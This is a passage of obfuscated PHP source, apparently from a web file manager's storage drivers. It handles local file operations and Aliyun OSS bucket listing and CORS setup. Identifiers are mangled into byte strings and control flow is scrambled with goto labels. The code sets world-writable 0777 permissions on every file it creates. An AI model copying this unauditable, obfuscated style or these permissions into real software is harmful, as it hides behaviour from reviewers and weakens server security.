BASIC_PATH . substr($F•ÑÔ²Æé, 2); } if (substr($A½ö‘İ‘, 0, 2) == $D¬ÅÆ’Æ²[1226]) { $A½ö‘İ‘ = BASIC_PATH . substr($A½ö‘İ‘, 2); } $F•ÑÔ²Æé = KodIO::clear($F•ÑÔ²Æé); goto f´ÈùëŞ¨å; B‹’’Ÿ¦‡™: return $this->pathDriver . $D¬ÅÆ’Æ²[8] . ltrim($A½ö‘İ‘, $D¬ÅÆ’Æ²[8]); goto F›†ğÔŒ; f´ÈùëŞ¨å: $A½ö‘İ‘ = KodIO::clear($A½ö‘İ‘); $A½ö‘İ‘ = substr($A½ö‘İ‘, strlen($F•ÑÔ²Æé)); if (empty($this->pathDriver)) { return $A½ö‘İ‘; } goto B‹’’Ÿ¦‡™; F›†ğÔŒ: } public function mkfile($cùšõå¸‘§, $E†ªÇ¿»–Œ = '', $B®¦©Æã‡‹ = REPEAT_RENAME) { $cùšõå¸‘§ = $this->iconvSystem($cùšõå¸‘§); @touch($cùšõå¸‘§); if ($E†ªÇ¿»–Œ) { file_put_contents($cùšõå¸‘§, $E†ªÇ¿»–Œ); } @chmod($cùšõå¸‘§, 511); return is_file($cùšõå¸‘§) ? $this->getPathOuter($cùšõå¸‘§) : !1; } public function mkdir($B¿èÌ×ÊªÕ, $eù¸ÓÒÒù = REPEAT_SKIP) { $B¿èÌ×ÊªÕ = $this->iconvSystem($B¿èÌ×ÊªÕ); if (is_dir($B¿èÌ×ÊªÕ)) { return $this->getPathOuter($B¿èÌ×ÊªÕ); } @mkdir($B¿èÌ×ÊªÕ, 511, !0); @chmod($B¿èÌ×ÊªÕ, 511); return is_dir($B¿èÌ×ÊªÕ) ? $this->getPathOuter($B¿èÌ×ÊªÕ) : !1; } public function copyFile($cğè‰ÑË¦ˆ, $fê­¢Ãºà‚) { $this->mkdir($this->pathFather($fê­¢Ãºà‚)); $cğè‰ÑË¦ˆ = $this->iconvSystem($cğè‰ÑË¦ˆ); $fê­¢Ãºà‚ = $this->iconvSystem($fê­¢Ãºà‚); $A÷¯ŞßÁØ = copy_64($cğè‰ÑË¦ˆ, $fê­¢Ãºà‚); @chmod($fê­¢Ãºà‚, 511); return $A÷¯ŞßÁØ ? $this->getPathOuter($fê­¢Ãºà‚) : !1; } public function moveFile($A„‘ÌÂßà—, $AŸÍæ©ƒõÌ) { goto F£óáÃŞ„¡; e§§Ãƒ¯³¨: $aƒåã“± = intval(@rename($A„‘ÌÂßà—, $AŸÍæ©ƒõÌ)); if (!$aƒåã“±) { if ($aƒåã“± = intval(@copy_64($A„‘ÌÂßà—, $AŸÍæ©ƒõÌ))) { @unlink($A„‘ÌÂßà—); } } @chmod($AŸÍæ©ƒõÌ, 511); goto D×‰ù—; F£óáÃŞ„¡: $this->mkdir($this->pathFather($AŸÍæ©ƒõÌ)); $A„‘ÌÂßà— = $this->iconvSystem($A„‘ÌÂßà—); $AŸÍæ©ƒõÌ = $this->iconvSystem($AŸÍæ©ƒõÌ); goto e§§Ãƒ¯³¨; D×‰ù—: return $aƒåã“± ? $this->getPathOuter($AŸÍæ©ƒõÌ) : !1; goto Dµ±¾×Áë¡; Dµ±¾×Áë¡: } public function delFile($AÈç‰Ÿî¥²) { $AÈç‰Ÿî¥² = $this->iconvSystem($AÈç‰Ÿî¥²); if (!@unlink($AÈç‰Ÿî¥²)) { @chmod($AÈç‰Ÿî¥², 511); if (!@unlink($AÈç‰Ÿî¥²)) { return !1; } } else { return !0; } } public function delFolder($aƒÄì¼Åæà) { goto A×‘•ÊÙî; DŸİŠˆËø: return rmdir($aƒÄì¼Åæà); goto AìŠº¢â‡; A×‘•ÊÙî: $C¼™í…’ï— =& $_SERVER[Ïº«‚ßèÔˆø]; $aƒÄì¼Åæà = $this->iconvSystem($aƒÄì¼Åæà); if (!is_dir($aƒÄì¼Åæà)) { return !0; } goto eõÏåä˜©ë; eõÏåä˜©ë: if (!($cò‘Çë†ŠÒ = opendir($aƒÄì¼Åæà))) { return !1; } while (($fË«‰¦ğ¹¤ = readdir($cò‘Çë†ŠÒ)) !== !1) { if ($fË«‰¦ğ¹¤ == $C¼™í…’ï—[95] || $fË«‰¦ğ¹¤ == $C¼™í…’ï—[1233]) { continue; } $E˜ºÚİ©ì = $aƒÄì¼Åæà . $C¼™í…’ï—[8] . $fË«‰¦ğ¹¤; if (is_file($E˜ºÚİ©ì) || is_link($E˜ºÚİ©ì)) { if (!unlink($E˜ºÚİ©ì)) { chmod($E˜ºÚİ©ì, 511); if (!unlink($E˜ºÚİ©ì)) { return !1; } } } else { if (is_dir($E˜ºÚİ©ì)) { chmod($E˜ºÚİ©ì, 511); $E˜ºÚİ©ì = $this->iconvApp($E˜ºÚİ©ì); if (!$this->delFolder($E˜ºÚİ©ì)) { return !1; } } } } closedir($cò‘Çë†ŠÒ); goto DŸİŠˆËø; AìŠº¢â‡: } public function rename($c—´à¾ÒÈ×, $bÙ„ÏöÜˆ÷) { goto CöÁàíò¯ê; BÙ¾ÁòÉäÊ: $Aá¨ŞÔµ¨ = @rename($c—´à¾ÒÈ×, $bëõîÙô‚„); $bëõîÙô‚„ = $this->iconvApp($bëõîÙô‚„); return $Aá¨ŞÔµ¨ ? $this->getPathOuter($bëõîÙô‚„) : !1; goto fÜˆòŒ¶¶¬; Bâ×·å‚ƒ: $c—´à¾ÒÈ× = $this->iconvSystem($c—´à¾ÒÈ×); $b·ƒ…Ú„ƒ = $this->pathFather($c—´à¾ÒÈ×); $bëõîÙô‚„ = rtrim($b·ƒ…Ú„ƒ, $Fİ’¨¼‚¢[8]) . $Fİ’¨¼‚¢[8] . $a¾ÓÑï½Ö³; goto BÙ¾ÁòÉäÊ; CöÁàíò¯ê: $Fİ’¨¼‚¢ =& $_SERVER[Ïº«‚ßèÔˆø]; $a¾ÓÑï½Ö³ = $this->fileNameAuto($this->pathFather($c—´à¾ÒÈ×), $bÙ„ÏöÜˆ÷); $a¾ÓÑï½Ö³ = $this->iconvSystem($a¾ÓÑï½Ö³); goto Bâ×·å‚ƒ; fÜˆòŒ¶¶¬: } public function size($BÕôéàŞ) { $BÕôéàŞ = $this->iconvSystem($BÕôéàŞ); return filesize_64($BÕôéàŞ); } public function info($aßˆ«¼ó³–) { $aßˆ«¼ó³– = $this->iconvSystem($aßˆ«¼ó³–); if ($this->isFolder($aßˆ«¼ó³–)) { return $this->folderInfo($aßˆ«¼ó³–); } else { if ($this->isFile($aßˆ«¼ó³–)) { return $this->fileInfo($aßˆ«¼ó³–); } } return !1; } protected function infoChildren($f¦“é£ì, &$Eî¶„Äù»ª, $BË­Ó‘Œ– = true) { goto aÉ¹˜çº±; a£é£ìñ”à: closedir($aĞÈÍ´ç±›); goto Eó…êµÆø…; aÉ¹˜çº±: $E‘Ÿ®ŠËç =& $_SERVER[Ïº«‚ßèÔˆø]; check_abort_echo(); $f¦“é£ì = rtrim($f¦“é£ì, $E‘Ÿ®ŠËç[8]) . $E‘Ÿ®ŠËç[8]; goto cÛ¹â¦Ë‡Ó; cÛ¹â¦Ë‡Ó: if ($BË­Ó‘Œ–) { $f¦“é£ì = $this->iconvSystem($f¦“é£ì); } if (!($aĞÈÍ´ç±› = @opendir($f¦“é£ì))) { return; } while (($aó™×ª¦°‘ = readdir($aĞÈÍ´ç±›)) !== !1) { if ($aó™×ª¦°‘ == $E‘Ÿ®ŠËç[95] || $aó™×ª¦°‘ == $E‘Ÿ®ŠËç[1233]) { continue; } $D»÷™ó¯èß = $f¦“é£ì . $aó™×ª¦°‘; if (is_file($D»÷™ó¯èß) || is_link($D»÷™ó¯èß)) { $Eî¶„Äù»ª[$E‘Ÿ®ŠËç[79]]++; $Eî¶„Äù»ª[$E‘Ÿ®ŠËç[78]] += filesize_64($D»÷™ó¯èß); } else { if (is_dir($D»÷™ó¯èß)) { $Eî¶„Äù»ª[$E‘Ÿ®ŠËç[80]]++; $this->infoChildren($D»÷™ó¯èß, $Eî¶„Äù»ª, !1); } } } goto a£é£ìñ”à; Eó…êµÆø…: } private function folderInfo($Aì§ºÓö°…, $a®°è‹ãê¸ = false) { $EÙ‹°¤™Ó =& $_SERVER[Ïº«‚ßèÔˆø]; $Aì§ºÓö°… = rtrim($Aì§ºÓö°…, $EÙ‹°¤™Ó[8]) . $EÙ‹°¤™Ó[8]; $DÛù„¼Òë° = $this->iconvApp($this->pathThis($Aì§ºÓö°…)); if ($a®°è‹ãê¸) { return array($EÙ‹°¤™Ó[28] => $DÛù„¼Òë°, $EÙ‹°¤™Ó[76] => $this->getPathOuter($Aì§ºÓö°…), $EÙ‹°¤™Ó[29] => $EÙ‹°¤™Ó[77]); } $f·ø½é¿› = array($EÙ‹°¤™Ó[28] => $DÛù„¼Òë°, $EÙ‹°¤™Ó[76] => $this->getPathOuter($Aì§ºÓö°…), $EÙ‹°¤™Ó[29] => $EÙ‹°¤™Ó[77], $EÙ‹°¤™Ó[193] => @filectime($Aì§ºÓö°…), $EÙ‹°¤™Ó[84] => @filemtime($Aì§ºÓö°…), $EÙ‹°¤™Ó[1236] => @fileatime($Aì§ºÓö°…), $EÙ‹°¤™Ó[1237] => is_readable($Aì§ºÓö°…), $EÙ‹°¤™Ó[1238] => is_writable($Aì§ºÓö°…), $EÙ‹°¤™Ó[1239] => get_mode($Aì§ºÓö°…)); return $f·ø½é¿›; } private function fileInfo($cğ¢õ®¨æˆ, $F¢Û®³ˆÂª = false) { $fù””×¶Òª =& $_SERVER[Ïº«‚ßèÔˆø]; $eÕ‚’ï§Ê = $this->iconvApp($this->pathThis($cğ¢õ®¨æˆ)); if ($F¢Û®³ˆÂª) { return array($fù””×¶Òª[28] => $eÕ‚’ï§Ê, $fù””×¶Òª[76] => $this->getPathOuter($cğ¢õ®¨æˆ), $fù””×¶Òª[29] => $fù””×¶Òª[192], $fù””×¶Òª[78] => $this->size($cğ¢õ®¨æˆ), $fù””×¶Òª[168] => $this->ext($eÕ‚’ï§Ê)); } $BÂ¡†«ï” = array($fù””×¶Òª[28] => $eÕ‚’ï§Ê, $fù””×¶Òª[76] => $this->getPathOuter($cğ¢õ®¨æˆ), $fù””×¶Òª[29] => $fù””×¶Òª[192], $fù””×¶Òª[193] => @filectime($cğ¢õ®¨æˆ), $fù””×¶Òª[84] => @filemtime($cğ¢õ®¨æˆ), $fù””×¶Òª[1236] => @fileatime($cğ¢õ®¨æˆ), $fù””×¶Òª[78] => $this->size($cğ¢õ®¨æˆ), $fù””×¶Òª[168] => $this->ext($eÕ‚’ï§Ê), $fù””×¶Òª[1237] => is_readable($cğ¢õ®¨æˆ), $fù””×¶Òª[1238] => is_writable($cğ¢õ®¨æˆ), $fù””×¶Òª[1239] => get_mode($cğ¢õ®¨æˆ)); return $BÂ¡†«ï”; } public function exist($eµÎ¢ØÅÊ) { $eµÎ¢ØÅÊ = $this->iconvSystem($eµÎ¢ØÅÊ); return @file_exists($eµÎ¢ØÅÊ); } public function isFile($cˆ”™ë¾) { $cˆ”™ë¾ = $this->iconvSystem($cˆ”™ë¾); return @is_file($cˆ”™ë¾); } public function isFolder($fõœ¯Ñğ«™) { $fõœ¯Ñğ«™ = $this->iconvSystem($fõœ¯Ñğ«™); return @is_dir($fõœ¯Ñğ«™); } public function listPath($a›ÛÊµÇÚÂ, $d¹šÂ¶¯”â = false) { goto DöŞ˜Ò¬Ä; CÛª†êí‘: closedir($AÑ¥ÏÜ¸Ïæ); return $Aø¤¡ÛæÜ‹; goto b¥¦¤®ôîÄ; DöŞ˜Ò¬Ä: $D¿¬‡òŠÜ÷ =& $_SERVER[Ïº«‚ßèÔˆø]; $a›ÛÊµÇÚÂ = $this->iconvSystem($a›ÛÊµÇÚÂ); $a›ÛÊµÇÚÂ = rtrim($a›ÛÊµÇÚÂ, $D¿¬‡òŠÜ÷[8]) . $D¿¬‡òŠÜ÷[8]; goto fÆ¸Øï†˜; fÆ¸Øï†˜: $Aø¤¡ÛæÜ‹ = array($D¿¬‡òŠÜ÷[75] => array(), $D¿¬‡òŠÜ÷[74] => array()); if (!($AÑ¥ÏÜ¸Ïæ = @opendir($a›ÛÊµÇÚÂ))) { return $Aø¤¡ÛæÜ‹; } while (($eÕš¥Ñíè = readdir($AÑ¥ÏÜ¸Ïæ)) !== !1) { if ($eÕš¥Ñíè == $D¿¬‡òŠÜ÷[95] || $eÕš¥Ñíè == $D¿¬‡òŠÜ÷[1233]) { continue; } $eêÃŠ¸±³ = $a›ÛÊµÇÚÂ . $eÕš¥Ñíè; if (is_file($eêÃŠ¸±³)) { $Aø¤¡ÛæÜ‹[$D¿¬‡òŠÜ÷[74]][] = $this->fileInfo($eêÃŠ¸±³, $d¹šÂ¶¯”â); } else { $Aø¤¡ÛæÜ‹[$D¿¬‡òŠÜ÷[75]][] = $this->folderInfo($eêÃŠ¸±³, $d¹šÂ¶¯”â); } } goto CÛª†êí‘; b¥¦¤®ôîÄ: } public function listAll($aŠ…½ Ç, &$b…Ç’÷ô“º = array()) { goto EÌÌù‹İ‡˜; EÛÒ¥”¨”Ë: if (!($EñŸï¤¤ìö = @opendir($aŠ…½ Ç))) { return $b…Ç’÷ô“º; } while (($d™š‡– äæ = readdir($EñŸï¤¤ìö)) !== !1) { if ($d™š‡– äæ == $AĞÜ†Ÿ…¢ê[95] || $d™š‡– äæ == $AĞÜ†Ÿ…¢ê[1233]) { continue; } $CèØœ­šÌ = $aŠ…½ Ç . $d™š‡– äæ; if (is_dir($CèØœ­šÌ) && !is_link($CèØœ­šÌ)) { $b…Ç’÷ô“º[] = array($AĞÜ†Ÿ…¢ê[76] => $CèØœ­šÌ . $AĞÜ†Ÿ…¢ê[8], $AĞÜ†Ÿ…¢ê[77] => 1, $AĞÜ†Ÿ…¢ê[84] => @filemtime($CèØœ­šÌ), $AĞÜ†Ÿ…¢ê[78] => 0); $this->listAll($CèØœ­šÌ, $b…Ç’÷ô“º); } else { $b…Ç’÷ô“º[] = array($AĞÜ†Ÿ…¢ê[76] => $CèØœ­šÌ, $AĞÜ†Ÿ…¢ê[77] => 0, $AĞÜ†Ÿ…¢ê[84] => @filemtime($CèØœ­šÌ), $AĞÜ†Ÿ…¢ê[78] => $this->size($CèØœ­šÌ)); } } closedir($EñŸï¤¤ìö); goto F¦‡ßÏµò; EÌÌù‹İ‡˜: $AĞÜ†Ÿ…¢ê =& $_SERVER[Ïº«‚ßèÔˆø]; $aŠ…½ Ç = $this->iconvSystem($aŠ…½ Ç); $aŠ…½ Ç = rtrim($aŠ…½ Ç, $AĞÜ†Ÿ…¢ê[8]) . $AĞÜ†Ÿ…¢ê[8]; goto EÛÒ¥”¨”Ë; F¦‡ßÏµò: return $b…Ç’÷ô“º; goto BÑ–º‰è; BÑ–º‰è: } public function has($B¿£¨°à­Ø, $c¥…Ã ñ÷ = false, $bô²â£êÛ = true) { goto bÑ†…™·âÕ; EŒÂ„Æî”Õ: $c™í™ã²… = 0; while (($aÅÀ¬š¾¨¨ = readdir($f™™çÃƒå)) !== !1) { if ($aÅÀ¬š¾¨¨ == $E„ÄÍˆÊ’[95] || $aÅÀ¬š¾¨¨ == $E„ÄÍˆÊ’[1233]) { continue; } $A«íºµ’¡© = $B¿£¨°à­Ø . $aÅÀ¬š¾¨¨; if ($c¥…Ã ñ÷) { $c™í™ã²…++; if (@is_file($A«íºµ’¡©)) { $dÒˆÇõ³«++; } else { $f§íß‹Š¹“++; } if ($c™í™ã²… > 10000) { break; } continue; } if ($bô²â£êÛ) { if (@is_file($A«íºµ’¡©)) { return !0; } } else { if (@is_dir($A«íºµ’¡© . $E„ÄÍˆÊ’[8])) { return !0; } } } closedir($f™™çÃƒå); goto F„©ôäëÚ„; bÑ†…™·âÕ: $E„ÄÍˆÊ’ =& $_SERVER[Ïº«‚ßèÔˆø]; $B¿£¨°à­Ø = $this->iconvSystem($B¿£¨°à­Ø); $B¿£¨°à­Ø = rtrim($B¿£¨°à­Ø, $E„ÄÍˆÊ’[8]) . $E„ÄÍˆÊ’[8]; goto fß‚ï¿Ê¯; F„©ôäëÚ„: if ($c¥…Ã ñ÷) { return array($E„ÄÍˆÊ’[202] => $dÒˆÇõ³«, $E„ÄÍˆÊ’[203] => $f§íß‹Š¹“); } return !1; goto C‘Ê‹¢«Ó—; fß‚ï¿Ê¯: if (!($f™™çÃƒå = @opendir($B¿£¨°à­Ø))) { return !1; } $dÒˆÇõ³« = 0; $f§íß‹Š¹“ = 0; goto EŒÂ„Æî”Õ; C‘Ê‹¢«Ó—: } public function hashSimple($CÔ…›«ƒ¶•) { goto açÒ¶´±¶¤; eØ•ˆšÏ›ï: return md5($B“ª¸š¤Ş) . $a¸‡Üê÷; goto bÆœ·íªÑÃ; açÒ¶´±¶¤: $BÈò÷‘äÖŞ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$CÔ…›«ƒ¶•) { return md5($BÈò÷‘äÖŞ[33]); } $CÔ…›«ƒ¶• = $this->iconvSystem($CÔ…›«ƒ¶•); goto EŒô±½Ï; EŒô±½Ï: $a¸‡Üê÷ = $this->size($CÔ…›«ƒ¶•); $A‡™²Ü¿÷¾ = 200; $BòƒÜ‚¥ = 50; goto dêìêãœå; dêìêãœå: if ($a¸‡Üê÷ <= $A‡™²Ü¿÷¾ * $BòƒÜ‚¥) { return $this->hashMd5($CÔ…›«ƒ¶•) . $a¸‡Üê÷; } $B“ª¸š¤Ş = $BÈò÷‘äÖŞ[33]; $cÉÑƒ©¸Ÿ² = intval($a¸‡Üê÷ / $BòƒÜ‚¥); goto AŠ”Äê¥—Ô; BŞñ’ ÍîŠ: fseek_64($EÊÏäœ×ğ·, $a¸‡Üê÷ - $A‡™²Ü¿÷¾); $B“ª¸š¤Ş .= fread($EÊÏäœ×ğ·, $A‡™²Ü¿÷¾); fclose($EÊÏäœ×ğ·); goto eØ•ˆšÏ›ï; AŠ”Äê¥—Ô: $EÊÏäœ×ğ· = fopen($CÔ…›«ƒ¶•, $BÈò÷‘äÖŞ[1240]); if (!$EÊÏäœ×ğ·) { return $B“ª¸š¤Ş; } for ($Aâ£î×ŞŠ = 0; $Aâ£î×ŞŠ < $BòƒÜ‚¥; $Aâ£î×ŞŠ++) { fseek_64($EÊÏäœ×ğ·, $cÉÑƒ©¸Ÿ² * $Aâ£î×ŞŠ); $B“ª¸š¤Ş .= fread($EÊÏäœ×ğ·, $A‡™²Ü¿÷¾); } goto BŞñ’ ÍîŠ; bÆœ·íªÑÃ: } public function getContent($C“…•³á™µ) { $C“…•³á™µ = $this->iconvSystem($C“…•³á™µ); return file_get_contents($C“…•³á™µ); } public function setContent($eëÌŞŒÚµŒ, $f¾áóÎÂØÚ = '') { $eëÌŞŒÚµŒ = $this->iconvSystem($eëÌŞŒÚµŒ); $C®¶‘ã¤òÚ = @file_put_contents($eëÌŞŒÚµŒ, $f¾áóÎÂØÚ, LOCK_EX); clearstatcache(); @chmod($eëÌŞŒÚµŒ, 511); return $C®¶‘ã¤òÚ === !1 ? !1 : !0; } public function fileSubstr($eÜÖŸ•Œ¡¤, $D‹Êç‡‹· = 0, $A†…äÜ•ƒñ = false) { goto Cõ®ƒğˆ®¼; eˆ—ÃÔØ•İ: if ($A†…äÜ•ƒñ <= 0) { return $aÔ£Ü¬¤¨â[33]; } $eĞÒ¨¥‘ = fopen($eÜÖŸ•Œ¡¤, $aÔ£Ü¬¤¨â[1240]); if (!$eĞÒ¨¥‘) { return !1; } goto eÙØ¤¡×ƒ; Cõ®ƒğˆ®¼: $aÔ£Ü¬¤¨â =& $_SERVER[Ïº«‚ßèÔˆø]; $eÜÖŸ•Œ¡¤ = $this->iconvSystem($eÜÖŸ•Œ¡¤); if ($A†…äÜ•ƒñ === !1) { $A†…äÜ•ƒñ = $this->size($eÜÖŸ•Œ¡¤); } goto eˆ—ÃÔØ•İ; eÙØ¤¡×ƒ: fseek_64($eĞÒ¨¥‘, $D‹Êç‡‹·); $aßˆ¢‡è¸ = fread($eĞÒ¨¥‘, $A†…äÜ•ƒñ); fclose($eĞÒ¨¥‘); goto A¼çâ²†ä; A¼çâ²†ä: return $aßˆ¢‡è¸; goto Fî™Å‚îË; Fî™Å‚îË: } public function upload($A¦¶†²Ïìµ, $bä†İ‰†Îí, $e’ø»¶Ã• = false, $c¨•Öî×•¥ = REPEAT_REPLACE) { if ($e’ø»¶Ã•) { return $this->moveFile($bä†İ‰†Îí, $A¦¶†²Ïìµ); } return $this->copyFile($bä†İ‰†Îí, $A¦¶†²Ïìµ); } public function setModifyTime($f„ãæ‰âá†, $AŞ¯ö„á¯µ = '') { @touch($f„ãæ‰âá†, intval($AŞ¯ö„á¯µ)); } public function download($Eæ‘ËÎáÙÛ, $bÕïŞÛÃ¿Ş) { return $this->iconvSystem($Eæ‘ËÎáÙÛ); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($fÖŞ÷¬îƒå) { parent::__construct($fÖŞ÷¬îƒå); $this->signatureVersion($_SERVER[Ïº«‚ßèÔˆø][211]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($d¨ÕÊ’Ñ¨) { parent::__construct($d¨ÕÊ’Ñ¨); $this->signatureVersion($_SERVER[Ïº«‚ßèÔˆø][211]); } public function fileOutLink($aÅ“‚‚‚¬«) { $d½Á‘¬“Ñ =& $_SERVER[Ïº«‚ßèÔˆø]; if (substr($aÅ“‚‚‚¬«, 0, 7) == $d½Á‘¬“Ñ[1185]) { $aÅ“‚‚‚¬« = $d½Á‘¬“Ñ[1186] . substr($aÅ“‚‚‚¬«, 7); } header($d½Á‘¬“Ñ[159] . $aÅ“‚‚‚¬«); die; } } goto aØÔâÏŞ‘½; aØÔâÏŞ‘½: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($bæóˆò¤„è) { parent::__construct(); include_once SDK_DIR . $_SERVER[Ïº«‚ßèÔˆø][1241]; $this->_init($bæóˆò¤„è); } public function _init($CçùÚ®¿®) { $D¾Æ‡²ò =& $_SERVER[Ïº«‚ßèÔˆø]; foreach ($CçùÚ®¿® as $aÜ¥‡õëëô => $b’ËÊ³èÍ•) { if (isset($this->{$aÜ¥‡õëëô})) { $this->{$aÜ¥‡õëëô} = $b’ËÊ³èÍ•; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($D¾Æ‡²ò[1242] . LNG($D¾Æ‡²ò[1243])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto d¿Æ…ù«³; Eä òáÙ¡Ë: $e¾ ê†Ê¸½->addRule($aí¬ÔôÌÂ…); try { $this->client->putBucketCors($this->bucket, $e¾ ê†Ê¸½); } catch (OSS\Core\OssException $b‡¸¼¡…—) { return !1; } return !0; goto eØºÊ×µ­”; d¯Î´†…°: $aí¬ÔôÌÂ…->setMaxAgeSeconds(600); $aí¬ÔôÌÂ…->addExposeHeader($Bè–ÉÑáË®[1249]); $aí¬ÔôÌÂ…->addAllowedHeader($Bè–ÉÑáË®[1244]); goto Eä òáÙ¡Ë; D½çƒèšÇ: $aí¬ÔôÌÂ…->addAllowedOrigin($Bè–ÉÑáË®[1244]); $aí¬ÔôÌÂ…->addAllowedMethod($Bè–ÉÑáË®[1245]); $aí¬ÔôÌÂ…->addAllowedMethod($Bè–ÉÑáË®[1246]); goto b¥¶œâÕ®; b¥¶œâÕ®: $aí¬ÔôÌÂ…->addAllowedMethod($Bè–ÉÑáË®[1247]); $aí¬ÔôÌÂ…->addAllowedMethod($Bè–ÉÑáË®[1248]); $aí¬ÔôÌÂ…->addAllowedMethod($Bè–ÉÑáË®[158]); goto d¯Î´†…°; d¿Æ…ù«³: $Bè–ÉÑáË® =& $_SERVER[Ïº«‚ßèÔˆø]; $e¾ ê†Ê¸½ = new OSS\Model\CorsConfig(); $aí¬ÔôÌÂ… = new OSS\Model\CorsRule(); goto D½çƒèšÇ; eØºÊ×µ­”: } public function getBucketCors() { goto d©‹ê“Á›; fñÑáÌ„Ù: if (!$DŠÎŸ®³ˆØ || !($BØ¸ëîå¤‘ = $DŠÎŸ®³ˆØ->getRules())) { return null; } $BĞó¡”ö‹ = $BØ¸ëîå¤‘[0]->getAllowedOrigins(); $B…£§„’Öµ = $BØ¸ëîå¤‘[0]->getAllowedMethods(); goto A˜ÂµÛ…²–; dù•‘Ìù®: return array($f…ßĞÖÄÀƒ[181] => isset($BĞó¡”ö‹[0]) ? $BĞó¡”ö‹[0] : $f…ßĞÖÄÀƒ[33], $f…ßĞÖÄÀƒ[185] => $B…£§„’Öµ, $f…ßĞÖÄÀƒ[1250] => $eèœƒ‰ †, $f…ßĞÖÄÀƒ[1251] => isset($Fßœ½•¶…Û[0]) ? $Fßœ½•¶…Û[0] : $f…ßĞÖÄÀƒ[33], $f…ßĞÖÄÀƒ[183] => isset($D¡÷ãÙì·Ë[0]) ? $D¡÷ãÙì·Ë[0] : $f…ßĞÖÄÀƒ[33]); goto Eåˆ”Ö’ìø; A˜ÂµÛ…²–: $eèœƒ‰ † = $BØ¸ëîå¤‘[0]->getMaxAgeSeconds(); $Fßœ½•¶…Û = $BØ¸ëîå¤‘[0]->getExposeHeaders(); $D¡÷ãÙì·Ë = $BØ¸ëîå¤‘[0]->getAllowedHeaders(); goto dù•‘Ìù®; d©‹ê“Á›: $f…ßĞÖÄÀƒ =& $_SERVER[Ïº«‚ßèÔˆø]; $DŠÎŸ®³ˆØ = null; try { $DŠÎŸ®³ˆØ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $DÂùòå¯Úó) { return null; } goto fñÑáÌ„Ù; Eåˆ”Ö’ìø: } public function isBucketCors() { goto fŠ°ÏäÑ”; c±ÑÌçÍÚÙ: if ($f‚Ìëé“§ø[$BØ£èã¥·’[181]] != $BØ£èã¥·’[182] || $f‚Ìëé“§ø[$BØ£èã¥·’[183]] != $BØ£èã¥·’[182]) { return !1; } $E» •øÃ†Û = array_map($BØ£èã¥·’[184], $f‚Ìëé“§ø[$BØ£èã¥·’[185]]); if (!is_array($E» •øÃ†Û)) { $E» •øÃ†Û = array(); } goto E†ÚÏŠÙ¥‚; fŠ°ÏäÑ”: $BØ£èã¥·’ =& $_SERVER[Ïº«‚ßèÔˆø]; $f‚Ìëé“§ø = $this->getBucketCors(); if (!$f‚Ìëé“§ø || !is_array($f‚Ìëé“§ø)) { return !1; } goto c±ÑÌçÍÚÙ; E†ÚÏŠÙ¥‚: $Cßİ……¹ª = array($BØ£èã¥·’[186], $BØ£èã¥·’[187], $BØ£èã¥·’[188], $BØ£èã¥·’[189], $BØ£èã¥·’[190]); $B§ÛĞ¿©õä = array_diff($Cßİ……¹ª, $E» •øÃ†Û); return empty($B§ÛĞ¿©õä); goto c²ÀØÚ‰Œ»; c²ÀØÚ‰Œ»: } public function mkfile($FŞÒ¡Ô»Ôá, $CõÚŒÍìÂ› = '', $cÉ¬çâÎã¸ = REPEAT_RENAME) { $dÃŒÅŠò¡Í = $this->setContent($FŞÒ¡Ô»Ôá, $CõÚŒÍìÂ›); if ($dÃŒÅŠò¡Í !== !1) { return $this->getPathOuter($FŞÒ¡Ô»Ôá); } return !1; } public function mkdir($F÷¢ø½Ø˜, $EÃç–ç› ¤ = REPEAT_SKIP) { if ($this->_isFolder($F÷¢ø½Ø˜)) { return $this->getPathOuter($F÷¢ø½Ø˜); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($F÷¢ø½Ø˜)); } catch (OSS\Core\OssException $f‡°·öñ÷“) { return !1; } return $this->getPathOuter($F÷¢ø½Ø˜); } private function fileList($f¨¥¶ƒ¹, $f’†Ì’‡² = '', $f£Š®²ã†© = 0) { goto b®éô†´æ¸; a“Î¬Ñ¬ª: $BÇœË¢×»É = $fñ×ã—¾§¡ = array(); while (!0) { check_abort(); $DÛöÇ­ßšã = array($a¤àŠïÇ®[1252] => $f’†Ì’‡², $a¤àŠïÇ®[1253] => $bâÚßÇ…‡¹, $a¤àŠïÇ®[1254] => $fˆ†šéóİŸ, $a¤àŠïÇ®[1255] => $AŸŒ†ëŒ); try { $a†Ëø†Ô´ = $this->client->listObjects($this->bucket, $DÛöÇ­ßšã); } catch (OSS\Core\OssException $a šÂ³è·¹) { break; } $AŸŒ†ëŒ = $a†Ëø†Ô´->getNextMarker(); $e¯º±âÁ = $a†Ëø†Ô´->getObjectList(); $aßÈ¿Ø×æÍ = $a†Ëø†Ô´->getPrefixList(); foreach ($e¯º±âÁ as $dÜê×Ò¨›) { goto bá±éù‹‘; AßÍ‚ªğáê: $AÕô‹ï„ù¶ = $dÜê×Ò¨›->getLastModified(); $Bò½Ì¢èí© = $f£Š®²ã†© ? array($a¤àŠïÇ®[28] => $aËÛ³£¹¨ö, $a¤àŠïÇ®[78] => $F½¼»İœµ¸, $a¤àŠïÇ®[196] => strtotime($AÕô‹ï„ù¶)) : $aËÛ³£¹¨ö; $cÈ…ÛËá…É = $F½¼»İœµ¸ == 0 && substr($aËÛ³£¹¨ö, strlen($aËÛ³£¹¨ö) - 1, 1) == $a¤àŠïÇ®[8] ? !0 : !1; goto c©¢çğŸ; bá±éù‹‘: if ($dÜê×Ò¨›->getKey() == $bâÚßÇ…‡¹) { continue; } $aËÛ³£¹¨ö = $dÜê×Ò¨›->getKey(); $F½¼»İœµ¸ = $dÜê×Ò¨›->getSize(); goto AßÍ‚ªğáê; c©¢çğŸ: if ($EÉÖ³±‹œ) { $this->cacheMethod($a¤àŠïÇ®[198], $aËÛ³£¹¨ö, 